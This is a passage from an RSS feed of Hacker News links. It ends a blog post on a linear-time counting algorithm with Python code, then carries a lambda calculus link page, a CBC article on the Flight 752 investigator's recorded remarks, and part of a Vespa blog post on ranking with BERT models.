</tr>
<tr>
<td><strong>FC</strong></td>
<td>exactly one <strong>F</strong>, ending with <strong>C</strong></td>
</tr>
<tr>
<td><strong>FCC</strong></td>
<td>exactly one <strong>F</strong>, ending with <strong>CC</strong></td>
</tr>
<tr>
<td><strong>S</strong></td>
<td>no <strong>F</strong>, ending with <strong>S</strong></td>
</tr>
<tr>
<td><strong>C</strong></td>
<td>no <strong>F</strong>, ending with <strong>C</strong></td>
</tr>
<tr>
<td><strong>CC</strong></td>
<td>no <strong>F</strong>, ending with <strong>CC</strong></td>
</tr>
<tr>
<td><strong>F</strong></td>
<td>ending with <strong>F</strong></td>
</tr>
</tbody>
</table>
<p>If we could calculate these counters for each iteration using their previous value our solution could have become very fast as only one pass would be sufficient to solve the problem and this exactly what we will try to do next.</p>
<h2>The algorithmic solution</h2>
<p>After the first time unit our sequences look as follows:</p>
<p><img src="http://i2.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-6.gif?resize=140%2C45" alt="sig-6" data-recalc-dims="1"></p>
<p>with the following counters:</p>
<table>
<tbody>
<tr>
<th>Counter Name</th>
<th>Count&gt;</th>
</tr>
<tr>
<td><strong>FS</strong></td>
<td>0</td>
</tr>
<tr>
<td><strong>FC</strong></td>
<td>0</td>
</tr>
<tr>
<td><strong>FCC</strong></td>
<td>0</td>
</tr>
<tr>
<td><strong>S</strong></td>
<td>1</td>
</tr>
<tr>
<td><strong>C</strong></td>
<td>1</td>
</tr>
<tr>
<td><strong>CC</strong></td>
<td>0</td>
</tr>
<tr>
<td><strong>F</strong></td>
<td>1</td>
</tr>
</tbody>
</table>
<p>Adding all counters we get 3 which matches the valid signals we have so far.</p>
<p>The second time unit will append each or the S F C to each of the existing sequences, creating 9 possible combinations.</p>
<p>Since we already have broken down the existing sequences based on the rules of the problem, instead of creating all the combinations we can now use the known information to increase all the available counters for each of the S F C.</p>
<p>The next received message will do the following:</p>
<p><strong>Processing the S (success) case</strong><br>
The <strong>FS</strong> counter (has one Failure, ends with Success) becomes the total of the previous: FS, FC, FCC and F<br>
The <strong>S</strong> counter (has no Failure, ends with Success) becomes the total of the previous: S, C, CC</p>
<p><strong>Processing the C (corrupted message) case</strong></p>
<p>The <strong>FC</strong> counter (has one Failure, ends with C) becomes the total of the previous: FS and F<br>
The <strong>C</strong> counter (has no Failure, ends with C) becomes the previous: S<br>
The <strong>FCC</strong> counter (has no Failure, ends with C) becomes the previous: FC<br>
The <strong>CC</strong> counter (has no Failure, ends with C) becomes the previous: C</p>
<p><strong>Processing the F (failure message) case</strong><br>
The <strong>F</strong> counter (ending with Failure) will become the previous: C, S, CC</p>
<p>an easier to visualize view of what is said above is the following:</p>
<table>
<tbody>
<tr>
<th>Counters sequence with length N</th>
<th>Calculated based on previous sequence</th>
</tr>
<tr>
<td><strong>FS [n] </strong></td>
<td><strong>FS [n-1] + FC [n-1] + FCC [n-1] + F [n-1] </strong></td>
</tr>
<tr>
<td>FC [n]</td>
<td>FS [n-1] + F [n-1]</td>
</tr>
<tr>
<td>FCC [n]</td>
<td>FC [n-1]</td>
</tr>
<tr>
<td>S [n]</td>
<td>S [n-1] + C [n-1] + CC [n-1]</td>
</tr>
<tr>
<td>C [n]</td>
<td>S [n-1]</td>
</tr>
<tr>
<td>CC [n]</td>
<td>C [n-1]</td>
</tr>
<tr>
<td>F [n]</td>
<td>C [n-1] + S [n-1] + CC [n-1]</td>
</tr>
</tbody>
</table>
<p>Manually applying these calculations for several iterations we are getting the following results:</p>
<table>
<thead>
<tr>
<th title="Field #1">Counter</th>
<th title="Field #2">1</th>
<th title="Field #3">2</th>
<th title="Field #4">3</th>
<th title="Field #5">4</th>
<th title="Field #6">5</th>
<th title="Field #7">6</th>
<th title="Field #8">7</th>
<th title="Field #9">8</th>
<th title="Field #10">9</th>
<th title="Field #11">10</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>FS</strong></td>
<td>0</td>
<td>1</td>
<td>4</td>
<td>12</td>
<td>30</td>
<td>70</td>
<td>156</td>
<td>337</td>
<td>712</td>
<td>1479</td>
</tr>
<tr>
<td><strong>FC</strong></td>
<td>0</td>
<td>1</td>
<td>3</td>
<td>8</td>
<td>19</td>
<td>43</td>
<td>94</td>
<td>200</td>
<td>418</td>
<td>861</td>
</tr>
<tr>
<td><strong>FCC</strong></td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>3</td>
<td>8</td>
<td>19</td>
<td>43</td>
<td>94</td>
<td>200</td>
<td>418</td>
</tr>
<tr>
<td><strong>S</strong></td>
<td>1</td>
<td>2</td>
<td>4</td>
<td>7</td>
<td>13</td>
<td>24</td>
<td>44</td>
<td>81</td>
<td>149</td>
<td>274</td>
</tr>
<tr>
<td><strong>C</strong></td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>4</td>
<td>7</td>
<td>13</td>
<td>24</td>
<td>44</td>
<td>81</td>
<td>149</td>
</tr>
<tr>
<td><strong>CC</strong></td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>4</td>
<td>7</td>
<td>13</td>
<td>24</td>
<td>44</td>
<td>81</td>
</tr>
<tr>
<td><strong>F</strong></td>
<td>1</td>
<td>2</td>
<td>4</td>
<td>7</td>
<td>13</td>
<td>24</td>
<td>44</td>
<td>81</td>
<td>149</td>
<td>274</td>
</tr>
<tr>
<td><strong>Totals</strong></td>
<td><strong>3</strong></td>
<td><strong>8</strong></td>
<td><strong>19</strong></td>
<td><strong>43</strong></td>
<td><strong>94</strong></td>
<td><strong>200</strong></td>
<td><strong>418</strong></td>
<td><strong>861</strong></td>
<td><strong>1753</strong></td>
<td><strong>3536</strong></td>
</tr>
</tbody>
</table>
<p>Note that the bottom line of the above table contains the totals for each iteration; comparing them with we have gotten from the brutal solution we happily see that the results are matching so our algorithm is correct.</p>
<h2>The code</h2>
<p>Now that we have figured out the algorithm the next (and easiest) step is to to express it in code as can be seen here:</p>
<pre title="">def count_sequences(N):
    fs = 0
    fc = 0
    fcc = 0
    s = 1
    c = 1
    cc = 0
    f = 1

    n = 1
    while n &lt; N:
        fs, fc, fcc, s, c, cc, f = (
            fs + fc + fcc + f,
            fs + f,
            fc,
            s + c + cc,
            s,
            c,
            c + s + cc
        )
        n += 1

    return fs + fc + fcc + s + c + cc + f
</pre>
<p>We can also use the brutal solution to validate our implementation:</p>
<pre title="">for i in range(1, 10):
    assert count_sequences(i) == count_sequences_brutal(i)
</pre>
<p>Running the performance test as we did with the brutal solution previously:</p>
<pre title="">for time_units in [2, 3, 6, 10, 20, 25, 10000]:
    print(
        'time_units:', time_units, 'duration:',
        timeit.timeit(stmt=functools.partial(count_sequences, time_units), number=1)
    )
</pre>
<p>gives us the following results:</p>
<p><img src="http://i1.wp.com/codingismycraft.com/wp-content/uploads/2020/07/sig-8.gif?resize=393%2C171" alt="sig-8" data-recalc-dims="1"></p>
<p>Comparing this output with what we have gotten before proves that now we have an extremely much faster algorithm that can be used for a very large number of iteration without significant delays.</p>
<p>To be more precise the time complexity of our algorithm is linear (O(n)) while its space complexity is O(1) as we do not allocate any additional memory to run it.</p>
<h2>Conclusion</h2>
<p>In this posting we had to deal with a problem whose obvious solution was very time consuming but after thinking a bit and understanding it better we were able to discover a “smart” trick to solve it efficiently; the same approach is applicable to many similar problems where the best solution lies in discovering some “hidden” properties that are not apparent from the first glance.</p>

	</div></article></div>]]>
            </description>
            <link>http://codingismycraft.com/index.php/2020/07/03/thinking-about-algorithmic-problems-ii/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734171</guid>
            <pubDate>Sat, 04 Jul 2020 18:56:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Programming in Lambda Calculus]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23733949">thread link</a>) | @helmut_brandl
<br/>
July 4, 2020 | https://hbr.github.io/Lambda-Calculus/ | <a href="https://web.archive.org/web/*/https://hbr.github.io/Lambda-Calculus/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <li>
            Untyped Lambda Calculus

            <ul>
            <li>
            <p><a href="https://hbr.github.io/Lambda-Calculus/lambda.html">Programming in Lambda Calculus</a>
            <a href="https://hbr.github.io/Lambda-Calculus/lambda.pdf">(pdf)</a></p>

            This text addresses programmers who are interested in looking at lambda
            calculus as a programming language.
            </li>

            <li>
            <p><a href="https://hbr.github.io/Lambda-Calculus/untyped_lambda.pdf">Step by Step Introduction into Lambda
                Calculus</a></p>

            This text gives a step by step introduction to the untyped lambda
            calculus from a mathematical point of view.
            </li>
            </ul>
        </li>
        </div></div>]]>
            </description>
            <link>https://hbr.github.io/Lambda-Calculus/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23733949</guid>
            <pubDate>Sat, 04 Jul 2020 18:16:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iran dumps Flight 752 investigator, airspace open to conceal 'imminent' attack]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 7 (<a href="https://news.ycombinator.com/item?id=23733910">thread link</a>) | @refurb
<br/>
July 4, 2020 | https://www.cbc.ca/news/politics/audio-recording-iran-lead-investigator-flight-ps752-1.5636450 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/politics/audio-recording-iran-lead-investigator-flight-ps752-1.5636450">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A newly released audio recording suggests Iran's highest authorities allowed commercial airliners to fly in and out of Tehran during the period of intense military activity when Flight 752 was shot down — because closing the airspace would have given away the regime's plan to strike U.S. military bases in Iraq.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5636477.1593791704!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/plane-crash.jpg"></p></div><figcaption>The head of Iran's investigation into Flight PS752 has been replaced following the release of a recording of a conversation he had with a victim's relation in Canada.<!-- --> <!-- -->(Reuters)</figcaption></figure><p><span><p>A newly released audio recording suggests Iran's highest authorities allowed commercial airliners to fly in and out of Tehran during the period of intense military activity when Flight 752 was shot down — because closing the airspace would have given away the regime's plan to strike U.S. military bases in Iraq.</p>  <p>CBC News obtained a recording of a&nbsp;91-minute conversation that took place March 7&nbsp;between a victim's family member in Canada and Hassan Rezaeifar, who was appointed the head of Iran's investigation into the downing of the Kyiv-bound Ukraine International Airlines aircraft. The crash of Flight 752 killed 176 people, including 57 Canadians.</p>  <p>The recording, which reveals a number of damning details about the downing of the plane and Iran's response, is also in the custody of Canadian authorities.</p>  <p>Less than 24 hours after CBC News emailed Rezaeifar a copy of the recording and requested a response Thursday, news broke that he had been removed from his role overseeing Iran's investigation into the downing of Flight 752. Families in the United Kingdom — which has&nbsp;an embassy in Iran — were notified this morning that a new investigator is now in charge.</p>  <h2>Airspace kept open to avoid signalling&nbsp;attack:&nbsp;Rezaeifar</h2>  <p>In the recording, Rezaeifar said closing the airspace over Tehran could have exposed Iran's pending ballistic missile attack on U.S. air bases in Iraq in advance. That attack was retaliation for the United States' killing of Iran's top military leader,&nbsp;Gen.&nbsp;Qasem Soleimani.</p>  <p>"Some say we should have cleared the airspace," Rezaeifar said in Farsi on the recording. "The National Security Council is in charge.</p>  <p>"But let's say we had cleared the airspace. Wouldn't [it] give away our imminent attack?"</p>  <p>Flight 752 was shot down just four hours after the strike on the U.S. base. Rezaeifar added that&nbsp;closing the airspace could have meant cancelling flights. Iran earns hundreds of thousands of dollars <a href="https://www.cbc.ca/news/politics/iran-airspace-canadians-downed-flight-1.5481818" target="_blank">daily in fees for allowing flights in its airspace.</a></p>  <p>"Ok, let's assume we had delayed the Ukrainian flight for ten hours. Wouldn't it have cancelled all other flights after?" said Rezaeifar on the call.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/flight-752-crash.jpg 300w,https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/flight-752-crash.jpg 460w,https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/flight-752-crash.jpg 620w,https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/flight-752-crash.jpg 780w,https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/flight-752-crash.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5636474.1593790216!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/flight-752-crash.jpg"></p></div><figcaption>Investigators pick up debris at the crash site of the Ukraine International Airlines plane shot down after takeoff from Iran's Imam Khomeini Airport on Jan. 8, 2020. <!-- --> <!-- -->(Nazanin Tabatabaee/WANA via Reuters)</figcaption></figure></span></p>  <p>Thomas Juneau, an associate professor of international affairs at the University of Ottawa and former analyst of&nbsp;Middle East affairs, said Iran has been insisting the investigation will be independent — and the audio recording proves&nbsp;it's not.&nbsp;</p>  <p>"Having the lead investigator saying those things on that phone call really damages that fiction," said Juneau. "By removing him, they're trying to protect that facade."</p>  <h2>Passengers used as human shields, says expert</h2>  <p>Payam Akhavan, a Canadian-Iranian international law professor at McGill University and former UN prosecutor at The Hague, also reviewed CBC's copy of the recording. Akhavan argues the audio is a new piece of evidence showing the highest levels of Iran's government chose to keep planes full of people in the sky on a day of intense military activity.&nbsp;</p>  <p>"The senior leadership of the government willingly and knowingly disregarded these risks," said Akhavan. "This is not just a question of human error or mistake. It's a question of criminal&nbsp;recklessness.</p>  <p>"To knowingly put civilian aircraft in harm's way, to use civilian airliners in effect as human shields, clearly implicates criminal responsibility."</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/ps752-victims.jpg 300w,https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/ps752-victims.jpg 460w,https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/ps752-victims.jpg 620w,https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ps752-victims.jpg 780w,https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/ps752-victims.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5421757.1593792034!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ps752-victims.jpg"></p></div><figcaption>Dozens of Canadians, as well as students and academics studying in Canada, were killed in the downing of Flight 752.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Crash investigator in immediate contact with military</h2>  <p>Akhavan also said the audio implicates&nbsp;the investigation team in a cover-up.</p>  <p>In the recording,&nbsp;Rezaeifar —&nbsp;who was the head of the accident investigation board at the Iran Civil Aviation Organization at the time — says he&nbsp;picked up the phone five minutes after the plane crashed and was in immediate contact with Iran's military.</p>  <p>Rezaeifar said Amir-Ali Hajizadeh, the commander of the Aerospace Force of the Islamic Revolutionary Guard Corps (IRGC), admitted the military was ordered to shoot missiles due to national security concerns.</p>  <p>"I was informed at 6:30 a.m. and I called the IRGC at 6:35 a.m. and asked, 'Did you have a missile attack?'" Rezaeifar says in the recording. "Mr. Hajizadeh explained and said&nbsp;yes, and we had orders. He said there are some national security considerations in the country."</p>  <p>On January 11, Iran's military admitted it unintentionally shot down the plane and blamed human error, saying the military&nbsp;mistook the jetliner for a hostile target. That acknowledgement&nbsp;came after three days of denial and after satellite evidence showed&nbsp;that missiles had hit the aircraft.</p>  <p>Rezaeifar did not respond to CBC's request for a comment. His name is used throughout the audio recording&nbsp;and CBC News has copies of messages sent from his Instagram account setting up the phone call.</p>  <h2>Victim's family member 'intimidated'</h2>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5521619.1585951192!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/javad-soleimani.jpeg 300w,https://i.cbc.ca/1.5521619.1585951192!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/javad-soleimani.jpeg 460w,https://i.cbc.ca/1.5521619.1585951192!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/javad-soleimani.jpeg 620w,https://i.cbc.ca/1.5521619.1585951192!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/javad-soleimani.jpeg 780w,https://i.cbc.ca/1.5521619.1585951192!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/javad-soleimani.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5521619.1585951192!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/javad-soleimani.jpeg"></p></div><figcaption>Javad Soleimani's wife Elnaz Nabiy died in the destruction of Flight PS752.<!-- --> <!-- -->(Supplied)</figcaption></figure></span></p>  <p>Javad Soleimani (no relation to Gen.&nbsp;Qasem Soleimani) was&nbsp;the Edmonton PhD student on the other end of the call with Rezaeifar. He said&nbsp;Rezaeifar&nbsp;pressured him&nbsp;to remove an&nbsp;Instagram&nbsp;post critical of the Iranian regime. Soleimani has been an outspoken critic of Tehran since his wife Elnaz Nabiy died in the crash.</p>  <p>In that Instagram post, Soleimani wrote Iranians&nbsp;won't forget about the crimes the regime has committed against its own people.</p>  <p>"Please delete it from your Instagram," Rezaeifar tells&nbsp;Soleimani on the call. "Do you agree that out of 83 million people of Iran, only 10 or 12 people have hurt you? Why should those other 82 million people be insulted by this post?"</p>  <p>He then asks Soleimani if he thinks the Canadian government is more "benevolent" toward him.&nbsp;</p>  <p>"Are you certain that the whole Canadian government is good and uncorrupt?" asked Rezaeifar.</p>  <p>Two days later, Soleimani&nbsp;said,&nbsp;Iran's Ministry of Intelligence contacted his family members in Iran to exert more pressure on them about his behaviour on social media.&nbsp;</p>  <ul>   <li> <p><a href="https://www.cbc.ca/news/politics/iran-flight-752-ukraine-international-airlines-crash-1.5521377" target="_blank"><strong>Families of Flight 752 victims report threats, acts of intimidation — and blame Tehran</strong></a></p> </li>  </ul>  <p>"It's ridiculous," Soleimani told CBC News. "They just wanted to somehow threaten me to stop criticizing the regime on social media because I had many followers on Instagram.</p>  <p>"They tried to force me to be silent ... but honestly, I have nothing to lose. And I told him,&nbsp;I told him I have nothing to lose,&nbsp;so you cannot stop me by just threatening me by conversation over the phone."</p>  <h2>'Inappropriate' for investigator to pressure&nbsp;family member</h2>  <p>Juneau said it's "totally inappropriate" and "absurd" for the lead crash&nbsp;investigator&nbsp;to put pressure on&nbsp;a victim's family member in Canada. He also said it's not surprising.</p>  <p>"I did not expect the investigation to be independent and few serious analysts did," Juneau said. "This basically confirms it.</p>  <p>"It's not very smart. It's just not a good move."</p>  <p>He said the practice&nbsp;of the Islamic Republic is to exert psychological&nbsp;pressure,&nbsp;and often physical&nbsp;pressure, on anyone opposed to the regime,&nbsp;at home and abroad.</p>  <p>Juneau said he wants to know the extent of Rezaeifar's relationship with the IRGC and Iran's&nbsp;Ministry of Intelligence. He cautions the details of what Rezaeifar said on the recording might not be accurate, and might have been meant to exert pressure on Soleimani.</p>  <p>"Is it true?" said Juneau. "Is he boasting? Is he exaggerating some things to increase the level of intimidation towards family members? These are all questions that we don't know the answer to."</p>  <p>Syrine Khoury, press secretary to&nbsp;Foreign&nbsp;Affairs Minister&nbsp;François-Philippe Champagne, sent a written statement to CBC&nbsp;saying "interference with Canadian citizens is totally unacceptable, very troubling and won't be tolerated.</p>  <p>"The government of Canada denounces any and all attempts to coerce or pressure Canadians, especially those suffering the loss of a loved one," she added. "The government of Canada encourages anyone who feels threatened, unsafe or vulnerable to contact local law enforcement authorities."</p>  <p>Ralph Goodale, Canada's special adviser to the Trudeau government on the&nbsp;Flight 752 file, said the phone call&nbsp;"constitutes outrageous behaviour."</p>  <p>"It's wrong on every count of procedure, propriety, appropriateness. It's simply completely wrong," he said.&nbsp;</p>  <p>He added the International Coordination and Response Group formed by&nbsp;Canada, Ukraine, Sweden, Afghanistan and the United Kingdom to support victims' families will be investigating&nbsp;Rezaeifar's&nbsp;"interesting and provocative" comments about keeping the airspace open to see if there's truth to the remarks.&nbsp;</p>  <h2>Audio casts doubt on past reports</h2>  <p>Hamed Esmaeilion, the interim spokesperson for the association representing the families of the Canadian victims, said the recording raises serious concerns about the two reports Iran's Civil Aviation Organization has already published about Flight 752. Esmaeilion lost his wife, Parisa Eghbalian, and their nine-year-old daughter Reera in the destruction&nbsp;of Flight 752.</p>  <p>"I don't see any different between Rezaeifar and the new investigator," he said. "CAO is not independent. The whole organization is closely working with the IRGC."</p>  <p>Iran is expected to publish another report on the crash&nbsp;before heading to France on July 20 to download and analyze the plane's flight data recorders, according …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cbc.ca/news/politics/audio-recording-iran-lead-investigator-flight-ps752-1.5636450">https://www.cbc.ca/news/politics/audio-recording-iran-lead-investigator-flight-ps752-1.5636450</a></em></p>]]>
            </description>
            <link>https://www.cbc.ca/news/politics/audio-recording-iran-lead-investigator-flight-ps752-1.5636450</link>
            <guid isPermaLink="false">hacker-news-small-sites-23733910</guid>
            <pubDate>Sat, 04 Jul 2020 18:10:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using BERT for relevance ranking with Vespa]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23733854">thread link</a>) | @bratao
<br/>
July 4, 2020 | https://blog.vespa.ai/introducing-nlp-with-transformers-on-vespa/ | <a href="https://web.archive.org/web/*/https://blog.vespa.ai/introducing-nlp-with-transformers-on-vespa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <!-- Toc if any -->
                
                <!-- End Toc -->
                <p>It really isn’t an exaggeration to claim that the field of NLP has been
revolutionized in the last year or so by the introduction of the Transformer
and related models such as the Bidirectional Encoder Representations from
Transformers (BERT). Indeed, BERT has since it’s release dominated various
leaderboards on NLP related tasks such as <a href="https://microsoft.github.io/msmarco/">MS
MARCO</a>. Extending beyond research, a
growing number of companies have shown considerable interest in adopting these
models for production.</p>

<p>One of the reasons for this is the ease of getting started. This is in large
part due to <a href="https://huggingface.co/">Hugging Face</a> and it’s open-source
<a href="https://github.com/huggingface/transformers">Transformers library</a>. With this
library it’s easy to start with any of the thousand or so pretrained base
models, and fine-tune it to a specific task such as text classification,
translation, summarization, text generation or question/answering. This is an
attractive proposition considering that some of these base models are immense,
requiring huge amounts of data and computational resources to train. The cost
of training can sometimes run into the millions of dollars. In contrast, taking
a base model and fine-tuning it requires much less effort, making powerful NLP
capabilities available to a larger community.</p>

<p>Recently it has also become easier to deploy and serve these models in
production. The Transformers library has <a href="https://medium.com/microsoftazure/accelerate-your-nlp-pipelines-using-hugging-face-transformers-and-onnx-runtime-2443578f4333">added functionality to export models to
ONNX</a>,
allowing for greater flexibility in model serving since this is largely
independent from whether or not the model was trained on Tensorflow or PyTorch.
We’ve been working a lot lately on being able to evaluate Transformer models in
Vespa, so in this blog post we thought we would share a bit on how we perceive
the benefits of inference on Vespa, show how to use a transformer model in
ranking with a small sample application, and discuss future directions we are
working toward.</p>

<h3 id="why-vespa">Why Vespa?</h3>

<p>A common approach to serve machine learned models in general is to set up a
model server and call out to this service from somewhere in your serving stack.
This is fine for tasks that evaluate a single data point for each query, for
instance classification, text generation or translation. However, for certain
application types such as search and recommendation <a href="https://blog.vespa.ai/the-hardest-problem-in-computing/">this can become a scalability
bottleneck</a>, as these
applications need to evaluate the model with a potentially large number of
items. One can quickly reach network saturation due to the multiplicative
effect of number of queries per second, data points per query, and
representation size.</p>

<p><img src="https://blog.vespa.ai/assets/2020-07-02-introducing-nlp-with-transformers-on-vespa/external_model_server.png" alt="Evaluating models on an external model server"></p>

<p>One of the guiding principles in Vespa is to move the computation to the data
rather than the other way around. Vespa is a distributed application that
consists of a set of stateless nodes and a set of stateful content nodes which
contains the data. A query is first processed on the stateless layer before
being fanned out to the content nodes. The content nodes handle data-dependent
computation and each return their results back to the stateless layer where the
globally best results are determined.</p>

<p><img src="https://blog.vespa.ai/assets/2020-07-02-introducing-nlp-with-transformers-on-vespa/models_on_content_nodes.png" alt="Evaluating models on the content nodes"></p>

<p>So when deploying a Vespa application, the machine learned models are
automatically deployed to all content nodes, and evaluated there for each
query. This alleviates the cost of query time data transportation. Also, as
Vespa takes care of distributing data to all content nodes and redistributing
elastically, one can scale up computationally by adding more content nodes thus
distributing computation as well. Additionally, this reduces system complexity
as there are fewer production services to maintain. This last point is
something which one should not discount.</p>

<p>One of the really unique features of Vespa is the flexibility one has to
combine results from various features and string models together. For instance,
one could use a small, fast model in an early phase, and a more complex and
computationally expensive model that only runs on the most promising
candidates. From a text search perspective that could be BM25 combined with a
Transformer model. For instance:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
</pre></td><td><pre>rank-profile bm25_and_transformer {
    first-phase {
        expression: bm25(content)
    }
    second-phase {
        rerank-count: 10
        expression: onnx("bert.onnx")
    }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is an example of how to instruct Vespa to calculate the BM25 score as a
first stage and send the top 10 candidates to the BERT model. Note that this is
per content node, so with 10 content nodes, the BERT model is running
effectively on 100 data points.</p>

<p>Evaluation of models from different platforms such as Tensorflow, PyTorch,
XGBoost and LightGBM can be freely combined as well, even within the same
expression. To efficiently search for potential candidates one can use WAND.
Recently we’ve also added <a href="https://blog.vespa.ai/approximate-nearest-neighbor-search-in-vespa-part-1/">approximate nearest
neighbors</a>,
giving the option of a highly performant nearest neighbor search which can
naturally be based on textual representation as well.</p>

<p>In summary, Vespa offers ease of deployment, flexibility in combining many
types of models and computations out of the box without any plugins or
extensions, efficient evaluation without moving data around and a less complex
system to maintain. This makes Vespa an attractive platform.</p>

<h3 id="ranking-with-transformers">Ranking with Transformers</h3>

<p>For a taste of how to use Transformer models with Vespa we’ve added a small
sample application:
<a href="https://github.com/vespa-engine/sample-apps/tree/master/transformers">https://github.com/vespa-engine/sample-apps/tree/master/transformers</a>.
In this sample app we use the MS MARCO dataset which combines both queries,
content and relevance judgements. For the purposes of this sample, we won’t
fine-tune the model and will just use the base model as-is. Our goal is to set
up a Vespa application that indexes the documents and scores content based on a
BM25 stage followed by a Transformer stage. The sample app contains a README
that goes through all the steps, but here we’ll discuss some of the highlights.</p>

<p>One decision that needs to be made is which Transformer model to use. It’s
worth mentioning that large models have a significant computational cost which
has a direct impact on performance and the scalability of the application. So
to keep latency down we use a fairly small model (“nboost/pt-tinybert-msmarco”)
for this sample application. We download and export the model to ONNX using the
Transformers library. Our export script builds upon the official
<code>convert_graph_to_onnx.py</code> rather than using it directly because we want to use
the equivalent of the Transformer <code>AutoModelForSequenceClassification</code>, and the
official export script does not export the additional tensors required for the
linear transformation on top of the base model. The script puts the exported
model into the “models” directory of the Vespa application package where it
will ultimately be imported and distributed automatically to all content nodes.</p>

<p>We also need to create the data feed. As part of evaluating any Transformer
model, text needs to be tokenized. The tokenizer is part of the model as the
model is dependent upon stable tokenization during both training and inference.
For the purposes of this sample app, we have not implemented a tokenizer in
Vespa, meaning that we handle tokenization outside of Vespa. So in the
conversion of MS MARCO data to a Vespa feed, we also use the model’s tokenizer
to generate tokens for each piece of content. This means that when querying
Vespa, we currently need to send in the tokenized representation of the query
as well. In a follow-up post we will show how to port a tokenizer and use that
during document and query processing in Vespa.</p>

<p>Putting these together, we need to decide which fields to index for each piece
of content as well as how to compute each result. This means defining a
document schema which includes setting up expressions for how candidates for
retrieval should be calculated. The fields we set up for this sample
application are:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td><pre>field id type string {
    indexing: summary | attribute
}
field title type string {
    indexing: index | summary
}
field url type string {
    indexing: index
}
field body type string {
    indexing: index
}
field tokens type tensor&lt;float&gt;(d0[128]) {
    indexing: attribute
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code>id</code>, <code>title</code>, <code>url</code> and <code>body</code> fields come directly from MS MARCO. The
<code>tokens</code> field stores the token sequence from the tokenizer mentioned above. Note
that we’ve decided upon a  sequence length of 128 here to keep sizes small. The
cost of evaluating Transformer type models is generally quadratic in relation
to the sequence length, so keeping them short has significant gains in
performance. This means that we only store the first 128 tokens for each
document. The documents in MS MARCO are significantly larger than that however,
and a common way of handling that is to instead index up each paragraph, or
perhaps even each sentence, for every document. However, we have not done that
explicitly in this application.</p>

<p>We also need to define how to compute each result. Evaluating the model is
fairly easy in Vespa:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
</pre></td><td><pre>rank-profile transformer {
    first-phase {
        expression: bm25(title) + bm25(body)
    }
    second-phase {
        rerank-count: 10
        expression: onnx("rankmodel.onnx", "default", "output_1")
    }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The first-phase expression tells Vespa to calculate the BM25 score of the query
against the <code>title</code> and <code>body</code> fields. We use this as a first pass to avoid
evaluating the model on every document. The second-phase instructs Vespa to
evaluate <code>"rankmodel.onnx"</code> (the one exported from the
Transformers library) and calculate <code>"output_1"</code> with the top 10
candidates from the previous stage. Note that this isn’t the actual expressions
used in the sample app where the output from the model is sent through a linear
transformation for sequence classification.</p>

